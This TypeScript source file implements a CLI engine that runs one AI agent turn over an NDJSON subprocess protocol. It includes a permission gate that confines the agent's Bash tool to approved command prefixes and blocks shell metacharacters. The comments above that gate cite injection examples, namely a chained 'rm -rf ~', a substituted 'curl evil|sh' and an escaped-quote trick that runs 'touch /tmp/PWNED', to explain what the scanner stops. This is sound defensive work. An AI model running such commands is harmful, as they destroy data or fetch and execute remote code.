// packages/@monomind/cli/src/orgrt/agent-exec.ts
/**
 * Agent Exec engine — one-shot exposure of the AgentRunner surface over the
 * public subprocess protocol in doc/agent-exec-protocol.md (§3).
 *
 * Process model: the CALLER (e.g. monoagentcli) spawns `monomind agent exec`;
 * monomind resolves the requested runtime's AgentRunner and drives ONE agent
 * turn, adapting the `--prompt` string into the single-message async stream
 * the runner interface expects (`AgentRunArgs.prompt`). With
 * `--tools stdio` (+ `--tools-file` / `--tool-names`), tool handler
 * invocations are bridged to the caller as `tool_call` frames on stdout and
 * satisfied by `tool_result` frames on stdin — identically for native
 * runners (ClaudeAgentRunner registers them as real SDK tools) and fence
 * runners (subprocess CLIs render + parse the fence protocol in-process).
 *
 * stdout purity (§3): the ONLY thing this engine writes to stdout is NDJSON
 * events via the injected `emit` sink. Everything else goes to stderr.
 *
 * Cancellation semantics: `--timeout`, budget breach, and caller `cancel`
 * frames all funnel through `terminate()` — a fire-and-forget
 * `stream.return()` (the runner's finally-blocks SIGTERM/SIGKILL its child)
 * raced against a grace window, after which the engine resolves regardless.
 * A runner wedged mid-await cannot have its return() propagate until it
 * reaches a yield; the grace bound keeps the exec from hanging forever, and
 * the runner's own 2h/45s ladders remain the backstop for orphaned children.
 */

import type { Readable } from 'node:stream';
import { z } from 'zod';
import type { AgentMessage, AgentRunner, OrgToolDef } from './agent-runner.js';
import { classifyStderr } from './kimicode-runner.js';
import { loadCreateOrgSkillGuidance } from './org-design-skill.js';
import { resolveExecRunner, runnerSpec } from './runner-registry.js';

// ─── errors (§3.4 taxonomy) ─────────────────────────────────────────────────

export type ExecErrorCode =
  | 'auth'
  | 'quota'
  | 'missing-binary'
  | 'no-runner'
  | 'budget'
  | 'runner-error'
  | 'timeout'
  | 'cancelled'
  | 'bad-frame';

const FATAL_CODES = new Set<ExecErrorCode>([
  'auth',
  'quota',
  'missing-binary',
  'no-runner',
  'budget',
]);

// ─── options & events ───────────────────────────────────────────────────────

/** Tool definition from `--tools-file` (JSON Schema) or `--tool-names`. */
export interface ToolSpec {
  name: string;
  description: string;
  /** JSON Schema `{type:'object', properties, required}` (optional for --tool-names). */
  schema?: Record<string, unknown>;
}

export interface AgentExecOptions {
  runtime: string;
  prompt: string;
  systemPrompt?: string;
  model?: string;
  cwd?: string;
  resume?: string;
  maxTurns: number;
  /** Overall wall-clock cap (ms); undefined = none. */
  timeoutMs?: number;
  /** Max wait per caller tool_result frame (ms). */
  toolTimeoutMs: number;
  /** Optional spend cap (USD) checked at result granularity (see §3.1 note). */
  budgetUsd?: number;
  env?: Record<string, string>;
  /** null/[] = no caller-side tools. Non-empty enables the stdio bridge. */
  toolSpecs?: ToolSpec[] | null;
  /** Injectable runner for tests; production resolves via resolveExecRunner. */
  runnerOverride?: AgentRunner;
  /** Event sink — the command layer writes each object as one NDJSON line. */
  emit: (ev: Record<string, unknown>) => void;
  /** Frame source for the tool bridge (default: process.stdin at command layer). */
  stdin?: Readable;
  /** Grace window for stream.return() propagation before resolving (ms). */
  returnGraceMs?: number;
  /**
   * Command prefixes (e.g. "monomind", "monoagentcli") the SDK's own Bash
   * tool is allowed to run, on top of whatever toolSpecs were given. Real
   * shell access is far more reliable for the model to actually use than a
   * large custom MCP tool surface (observed directly: with only ~44
   * mcp__org__* tools, the model frequently refused and fabricated an
   * excuse rather than call one; the same requests reliably succeed via a
   * plain `monomind ...`/`monoagentcli ...` Bash invocation). Still fully
   * scoped, not a blanket Bash grant: canUseTool below only allows a Bash
   * call whose command starts with one of these prefixes (after trimming
   * leading whitespace) — everything else is denied exactly as before.
   * undefined/[] = no Bash allowance, matching prior behavior exactly.
   */
  allowBashPrefixes?: string[];
}

interface Terminal {
  code: ExecErrorCode;
  exitCode: number;
}

// ─── JSON Schema → zod shape (for OrgToolDef.schema) ────────────────────────

function jsonPropToZod(prop: unknown, required: boolean): z.ZodType<any> {
  let base: z.ZodType<any> = z.any();
  if (prop && typeof prop === 'object') {
    const p = prop as Record<string, unknown>;
    if (Array.isArray(p.enum)) base = z.enum(p.enum as [string, ...string[]]);
    else
      switch (p.type) {
        case 'string':
          base = z.string();
          break;
        case 'number':
        case 'integer':
          base = z.number();
          break;
        case 'boolean':
          base = z.boolean();
          break;
        case 'array':
          base = z.array(z.any());
          break;
        case 'object':
          base = z.record(z.string(), z.any());
          break;
      }
  }
  return required ? base : base.optional();
}

/** Convert `{type:'object', properties, required}` JSON Schema to a zod shape. */
export function jsonSchemaToZodShape(
  schema?: Record<string, unknown>,
): Record<string, z.ZodType<any>> {
  const shape: Record<string, z.ZodType<any>> = {};
  const props = (schema?.properties ?? {}) as Record<string, unknown>;
  const required = new Set(Array.isArray(schema?.required) ? (schema.required as unknown[]) : []);
  for (const [key, prop] of Object.entries(props)) {
    shape[key] = jsonPropToZod(prop, required.has(key));
  }
  return shape;
}

// ─── stdio frame bridge (§4.3) ──────────────────────────────────────────────

interface PendingCall {
  settle: (text: string) => void;
  timer: NodeJS.Timeout;
}

class StdioToolBridge {
  private pending = new Map<string, PendingCall>();
  private counter = 0;
  private closed = false;
  private buffer = '';
  private stopped = false;

  constructor(
    private stdin: Readable,
    private toolTimeoutMs: number,
    private emit: (ev: Record<string, unknown>) => void,
    /** Invoked synchronously on a cancel frame — wired to terminate(). */
    private onCancel?: () => void,
  ) {}

  start(): void {
    this.stdin.setEncoding('utf8');
    this.stdin.on('data', (chunk: string) => {
      if (this.stopped) return;
      this.buffer += chunk;
      let nl: number;
      while ((nl = this.buffer.indexOf('\n')) !== -1) {
        const line = this.buffer.slice(0, nl).trim();
        this.buffer = this.buffer.slice(nl + 1);
        if (line) this.handleLine(line);
      }
    });
    this.stdin.on('end', () => {
      // §4.3: EOF fails every pending call and disables further bridging.
      this.closed = true;
      for (const [id, p] of this.pending) {
        clearTimeout(p.timer);
        p.settle('ERROR: caller closed stdin');
        this.pending.delete(id);
      }
    });
    this.stdin.on('error', () => {
      this.closed = true;
    });
  }

  private handleLine(line: string): void {
    let frame: any;
    try {
      frame = JSON.parse(line);
    } catch {
      this.emit({
        v: 1,
        type: 'error',
        code: 'bad-frame',
        fatal: false,
        message: `unparseable stdin frame: ${line.slice(0, 120)}`,
      });
      return;
    }
    if (frame?.type === 'cancel') {
      this.cancelRequested = true;
      this.onCancel?.();
      return;
    }
    if (frame?.type === 'tool_result' && typeof frame.id === 'string') {
      const p = this.pending.get(frame.id);
      if (!p) {
        this.emit({
          v: 1,
          type: 'error',
          code: 'bad-frame',
          fatal: false,
          message: `tool_result for unknown or expired id "${frame.id}"`,
        });
        return;
      }
      clearTimeout(p.timer);
      this.pending.delete(frame.id);
      const text =
        frame.result && typeof frame.result === 'object' && typeof frame.result.text === 'string'
          ? frame.result.text
          : typeof frame.result === 'string'
            ? frame.result
            : JSON.stringify(frame.result ?? '');
      p.settle(frame.ok === false ? `ERROR: ${text}` : text);
      return;
    }
    this.emit({
      v: 1,
      type: 'error',
      code: 'bad-frame',
      fatal: false,
      message: `unrecognized stdin frame type: ${String(frame?.type ?? '(none)')}`,
    });
  }

  /** Set when the caller sends a cancel frame; polled by the engine loop. */
  cancelRequested = false;

  /** Invoke a tool on the caller: emit tool_call, await tool_result, echo it. */
  call(name: string, args: Record<string, unknown>): Promise<{ text: string }> {
    if (this.closed) return Promise.resolve({ text: 'ERROR: caller closed stdin' });
    const id = `tc_${++this.counter}`;
    return new Promise((resolve) => {
      const settle = (text: string) => {
        this.pending.delete(id);
        this.emit({
          v: 1,
          type: 'tool_result',
          id,
          ok: !text.startsWith('ERROR:'),
          result: { text },
        });
        resolve({ text });
      };
      const timer = setTimeout(() => settle('ERROR: tool timeout'), this.toolTimeoutMs);
      this.pending.set(id, { timer, settle });
      this.emit({ v: 1, type: 'tool_call', id, name, args });
    });
  }

  /** Stop reading; fail anything still pending. */
  stop(): void {
    this.stopped = true;
    this.closed = true;
    for (const [, p] of this.pending) {
      clearTimeout(p.timer);
      p.settle('ERROR: exec terminated');
    }
    this.pending.clear();
  }
}

// ─── usage accounting (cumulative→delta, session.ts parity) ────────────────

class UsageTracker {
  private cumulative = new Map<string, { in: number; out: number; usd: number }>();
  delta(m: AgentMessage): { in: number; out: number; usd: number } {
    const key = m.session_id ?? '';
    const prev = this.cumulative.get(key) ?? { in: 0, out: 0, usd: 0 };
    const cur = { in: m.input_tokens ?? 0, out: m.output_tokens ?? 0, usd: m.cost_usd ?? 0 };
    // Runners that report per-turn (not cumulative) usage would produce
    // negatives under naive differencing; treat decreasing totals as fresh.
    const d = {
      in: Math.max(0, cur.in - prev.in),
      out: Math.max(0, cur.out - prev.out),
      usd: Math.max(0, cur.usd - prev.usd),
    };
    this.cumulative.set(key, cur);
    return d;
  }
}

// ─── engine ─────────────────────────────────────────────────────────────────

function mapStopReason(
  subtype: string | undefined,
  rawTexts: string[],
  terminal: Terminal | null,
): string {
  if (terminal?.code === 'timeout') return 'timeout';
  if (terminal?.code === 'cancelled') return 'cancelled';
  if ((subtype ?? '').includes('max_turns')) return 'max_turns';
  if (rawTexts.some((t) => t.includes('tool-call round cap'))) return 'tool_round_cap';
  return 'end_turn';
}

/**
 * Run one agent exec turn. Emits protocol events via opts.emit and returns
 * the process exit code (§3.2): 0 success · 1 error · 124 timeout ·
 * 130 cancelled. `done` is emitted exactly once before returning.
 */
export async function runAgentExec(opts: AgentExecOptions): Promise<number> {
  const emit = opts.emit;
  const grace = opts.returnGraceMs ?? 5000;

  // Resolve runner (no-runner vs missing-binary is classified here).
  const runner = opts.runnerOverride ?? (await resolveExecRunner(opts.runtime));
  if (!runner) {
    const known = runnerSpec(opts.runtime);
    const message = known
      ? `runtime "${opts.runtime}" could not be constructed`
      : `unknown runtime "${opts.runtime}" — no AgentRunner implementation exists for it`;
    emit({ v: 1, type: 'error', code: 'no-runner', fatal: true, message });
    emit({ v: 1, type: 'done', exit_code: 2 });
    return 2;
  }

  // Tool specs (§4). The bridge itself is constructed below, after
  // terminate() exists (its cancel callback wires into termination).
  const toolSpecs = opts.toolSpecs ?? null;
  let bridge: StdioToolBridge | null = null;
  const tools: OrgToolDef[] = (toolSpecs ?? []).map((t) => ({
    name: t.name,
    description: t.description,
    schema: t.schema ? jsonSchemaToZodShape(t.schema) : {},
    handler: (args: Record<string, unknown>) =>
      bridge ? bridge.call(t.name, args) : Promise.resolve({ text: 'ERROR: tools not bridged' }),
  }));

  // Single-message prompt stream — the AgentRunArgs.prompt contract.
  const promptStream = (async function* () {
    yield {
      type: 'user',
      message: { role: 'user', content: opts.prompt },
      parent_tool_use_id: null,
      session_id: undefined,
    };
  })();

  const usage = new UsageTracker();
  const rawTexts: string[] = [];
  let lastSession: string | undefined;
  let totals = { in: 0, out: 0, usd: 0 };
  let lastResult: AgentMessage | undefined;
  // Holder object: `terminal` is assigned inside the terminate() closure and
  // read after the loop — TS flow analysis would otherwise keep the `null`
  // narrowing across closure calls and type the post-loop reads as `never`.
  const state: { terminal: Terminal | null } = { terminal: null };
  let stream: AsyncGenerator<AgentMessage> | null = null;

  // Post-done suppression: once `done` is emitted, nothing else goes out.
  let finished = false;
  const safeEmit = (ev: Record<string, unknown>): void => {
    if (finished) return;
    emit(ev);
  };

  // Termination races the consumer loop: a runner that goes quiet (wedged
  // child, hung SDK) must not pin the exec open — terminate() resolves the
  // race directly while the abandoned consumer finishes in the background.
  let settleTerminal: (t: Terminal) => void = () => {};
  const terminalPromise = new Promise<Terminal>((r) => {
    settleTerminal = r;
  });

  safeEmit({
    v: 1,
    type: 'start',
    runtime: opts.runtime,
    ...(opts.model ? { model: opts.model } : {}),
    cwd: opts.cwd ?? process.cwd(),
    ...(opts.resume ? { resume: opts.resume } : {}),
    pid: process.pid,
  });

  const terminate = (code: ExecErrorCode, exitCode: number) => {
    if (state.terminal) return;
    state.terminal = { code, exitCode };
    // Ladder the runner's return() (its finally-blocks kill the child) with
    // a grace bound — a wedged runner may not propagate until its own
    // 2h/45s ladders fire, and the exec must not wait for that.
    if (stream && typeof stream.return === 'function') {
      void Promise.race([
        stream.return(undefined as never).catch(() => {}),
        new Promise((r) => setTimeout(r, grace)),
      ]);
    }
    settleTerminal(state.terminal);
  };

  bridge =
    toolSpecs && toolSpecs.length > 0
      ? new StdioToolBridge(opts.stdin ?? process.stdin, opts.toolTimeoutMs, safeEmit, () =>
          terminate('cancelled', 130),
        )
      : null;
  bridge?.start();

  const timeoutTimer = opts.timeoutMs
    ? setTimeout(() => terminate('timeout', 124), opts.timeoutMs)
    : null;
  const onSignal = () => terminate('cancelled', 130);
  process.once('SIGINT', onSignal);
  process.once('SIGTERM', onSignal);

  // The SDK's own permission gate (permissionMode: 'default', set
  // unconditionally in ClaudeAgentRunner.run) requires either an
  // allow-listed tool name or a canUseTool callback to approve any call —
  // without one, every tool this exec call was explicitly given is denied
  // before it ever runs, and since this is a headless one-shot turn (no
  // TTY, no UI that could answer an interactive approval prompt), that
  // denial is permanent for the whole session, not just delayed. There's
  // no PolicyEngine/fence/human-approval infra here (that's the org-runtime
  // path's concern, see session.ts's gatedCanUseTool) — the caller already
  // decided the exact tool surface via --tools-file/--tool-names, so
  // approving every tool in that already-scoped list is the correct
  // default, not a laxer one: this narrows the SDK's own default-deny-all
  // down to exactly what was asked for, nothing broader.
  const allowedToolNames = new Set(tools.map((t) => `mcp__org__${t.name}`));
  const bashPrefixes = opts.allowBashPrefixes ?? [];
  // A prefix match on its own only checks the FIRST token — the whole
  // string still runs through a real shell, so `monomind org list; rm -rf
  // ~` or `` monomind org list `curl evil|sh` `` would pass a bare
  // startsWith() check and then execute the injected part too. Reject any
  // command containing shell metacharacters that could chain, substitute,
  // or redirect beyond the single literal invocation the prefix implies.
  //
  // This has to match real bash quoting rules, not just "any of these
  // characters anywhere" — a caller legitimately passing a JSON blob via
  // `--json '{"goal":"grow revenue & cut costs"}'` (org create-json's own
  // documented usage) has a bare `&` sitting right there, and inside single
  // quotes bash treats it as fully literal, same as `;`, `|`, a backtick, or
  // `>`/`<` — none of those are special there. Only three quoting states
  // matter: inside single quotes NOTHING is special (not even backtick/$());
  // inside double quotes only backtick and $( still trigger substitution;
  // outside any quotes everything below is live.
  //
  // Backslash-escaping must also be tracked explicitly — an earlier version
  // of this scanner didn't, which let `foo \'; touch /tmp/PWNED` slip
  // through: it treated the backslash-escaped `'` as a real quote-toggle
  // (entering "single-quoted" state), which then hid the trailing `;` from
  // detection — while bash itself sees `\'` outside any quotes as nothing
  // more than a literal `'` character, `;` still ends the command right
  // there. Outside single quotes, a `\` consumes and neutralizes the next
  // character (it can never toggle quote state or count as a metachar);
  // inside single quotes, backslash has no special meaning at all in bash,
  // so it's left to fall through to the "fully literal" branch untouched.
  const hasUnsafeShellSyntax = (cmd: string): boolean => {
    let inSingle = false;
    let inDouble = false;
    for (let i = 0; i < cmd.length; i++) {
      const c = cmd[i];
      if (c === '\\' && !inSingle) {
        i++; // skip the escaped character — never quote-toggling, never a metachar
        continue;
      }
      if (c === "'" && !inDouble) {
        inSingle = !inSingle;
        continue;
      }
      if (c === '"' && !inSingle) {
        inDouble = !inDouble;
        continue;
      }
      if (inSingle) continue; // fully literal — nothing below applies
      if (c === '`') return true; // substitution — live even inside "..."
      if (c === '$' && cmd[i + 1] === '(') return true; // $( ... ) — same
      if (inDouble) continue; // ;,&,|,<,>,\n are literal inside "..."
      if (c === ';' || c === '&' || c === '|' || c === '\n') return true;
      if (c === '>' || c === '<') return true;
      if (c === '<' && cmd[i + 1] === '(') return true; // redundant but explicit
    }
    return false;
  };
  const canUseTool = async (toolName: string, input: Record<string, unknown>) => {
    if (allowedToolNames.has(toolName)) return { behavior: 'allow' as const, updatedInput: input };
    if (toolName === 'Bash' && bashPrefixes.length > 0 && typeof input.command === 'string') {
      const cmd = input.command.trimStart();
      const matchesPrefix = bashPrefixes.some((p) => cmd === p || cmd.startsWith(`${p} `));
      if (matchesPrefix && !hasUnsafeShellSyntax(cmd))
        return { behavior: 'allow' as const, updatedInput: input };
      if (matchesPrefix)
        return {
          behavior: 'deny' as const,
          message:
            'Bash command contains shell metacharacters (;, &, |, `, $(, <() — only a single literal invocation is allowed, no chaining/substitution/redirection.',
        };
    }
    return {
      behavior: 'deny' as const,
      message:
        toolName === 'Bash' && bashPrefixes.length > 0
          ? `Bash is only allowed for commands starting with: ${bashPrefixes.join(', ')}.`
          : `Tool "${toolName}" was not in the tool list this exec call was given.`,
    };
  };

  // This session's own tool list has no way to reach the real
  // mastermind:createorg skill (no settingSources, no `skills` SDK option,
  // canUseTool above would deny a Skill tool call anyway) — if create_org
  // is among the tools this exec call was given, fold the skill's actual
  // content onto the system prompt instead of leaving the model to
  // free-style org design (single-root structure, archetype icon ids,
  // policy/provider conventions) from scratch every time.
  const hasOrgDesignTools = tools.some((t) => t.name === 'create_org');
  const skillGuidance = hasOrgDesignTools ? loadCreateOrgSkillGuidance() : null;
  const systemPrompt = skillGuidance
    ? `${opts.systemPrompt ?? ''}\n\n${skillGuidance}`
    : (opts.systemPrompt ?? '');

  const consumer = (async () => {
    try {
      stream = runner.run({
        tools,
        prompt: promptStream,
        systemPrompt,
        model: opts.model,
        cwd: opts.cwd ?? process.cwd(),
        env: opts.env ?? {},
        maxTurns: opts.maxTurns,
        resume: opts.resume,
        canUseTool,
      }) as AsyncGenerator<AgentMessage>;

      for await (const m of stream) {
        if (state.terminal) break;

        if (m.session_id && m.session_id !== lastSession) {
          lastSession = m.session_id;
          safeEmit({ v: 1, type: 'session', session_id: m.session_id });
        }

        if (m.type === 'assistant' && m.text) {
          rawTexts.push(m.text);
          safeEmit({ v: 1, type: 'assistant', text: m.text });
        } else if (m.type === 'result') {
          const d = usage.delta(m);
          totals = { in: totals.in + d.in, out: totals.out + d.out, usd: totals.usd + d.usd };
          safeEmit({
            v: 1,
            type: 'usage',
            input_tokens: d.in,
            output_tokens: d.out,
            cost_usd: d.usd,
          });
          lastResult = m;
          // Budget is enforced at result granularity on a single-shot exec:
          // the turn has completed, but the overspend is surfaced as the
          // terminal outcome (no success result event) so callers stop.
          if (opts.budgetUsd !== undefined && totals.usd > opts.budgetUsd) {
            terminate('budget', 1);
            safeEmit({
              v: 1,
              type: 'error',
              code: 'budget',
              fatal: true,
              message: `spend cap exceeded: $${totals.usd.toFixed(4)} > --budget-usd ${opts.budgetUsd}`,
            });
            break;
          }
        }
        // m.type === 'tool_use': native-tool liveness only — no protocol event.
      }
    } catch (err) {
      const e = err as NodeJS.ErrnoException;
      if (e.code === 'ENOENT') {
        const spec = runnerSpec(opts.runtime);
        terminate('missing-binary', 1);
        safeEmit({
          v: 1,
          type: 'error',
          code: 'missing-binary',
          fatal: true,
          message: `${opts.runtime} CLI not found${spec ? ` — ${spec.installHint}` : ''}`,
        });
      } else {
        const cls = classifyStderr(e.message ?? String(err));
        const code: ExecErrorCode = cls.fatal
          ? /auth/i.test(cls.label ?? '')
            ? 'auth'
            : 'quota'
          : 'runner-error';
        const spec = runnerSpec(opts.runtime);
        const msg = e.message ?? String(err);
        const login =
          code === 'auth' && spec?.loginHint && !/login|log in/i.test(msg)
            ? ` Run: ${spec.loginHint}`
            : '';
        terminate(code, 1);
        safeEmit({
          v: 1,
          type: 'error',
          code,
          fatal: FATAL_CODES.has(code),
          message: `${msg}${login}`,
        });
      }
    }
  })();

  try {
    await Promise.race([consumer, terminalPromise]);
  } finally {
    if (timeoutTimer) clearTimeout(timeoutTimer);
    bridge?.stop();
    process.removeListener('SIGINT', onSignal);
    process.removeListener('SIGTERM', onSignal);
  }

  const finish = (exitCode: number): number => {
    safeEmit({ v: 1, type: 'done', exit_code: exitCode });
    finished = true;
    return exitCode;
  };

  if (state.terminal) {
    // timeout/cancelled errors are emitted here (terminate() only ladders);
    // missing-binary/budget/auth/quota/runner-error already emitted inline.
    if (state.terminal.code === 'timeout' || state.terminal.code === 'cancelled') {
      safeEmit({
        v: 1,
        type: 'error',
        code: state.terminal.code,
        fatal: false,
        message:
          state.terminal.code === 'timeout'
            ? `exec exceeded overall timeout (${opts.timeoutMs}ms)`
            : 'cancelled by caller',
      });
    }
    return finish(state.terminal.exitCode);
  }

  if (!lastResult) {
    safeEmit({
      v: 1,
      type: 'error',
      code: 'runner-error',
      fatal: false,
      message: 'runner stream ended without a result message',
    });
    return finish(1);
  }

  const isError = lastResult.is_error === true || (lastResult.subtype ?? 'success') !== 'success';
  if (isError) {
    safeEmit({
      v: 1,
      type: 'error',
      code: 'runner-error',
      fatal: false,
      message:
        (lastResult as { text?: string }).text ?? `turn failed (${lastResult.subtype ?? 'error'})`,
    });
  }
  safeEmit({
    v: 1,
    type: 'result',
    subtype: isError ? 'error' : 'success',
    is_error: isError,
    stop_reason: mapStopReason(lastResult.subtype, rawTexts, state.terminal),
    ...((lastResult as { text?: string }).text
      ? { text: (lastResult as { text?: string }).text }
      : {}),
    input_tokens: totals.in,
    output_tokens: totals.out,
    cost_usd: totals.usd,
  });
  return finish(isError ? 1 : 0);
}
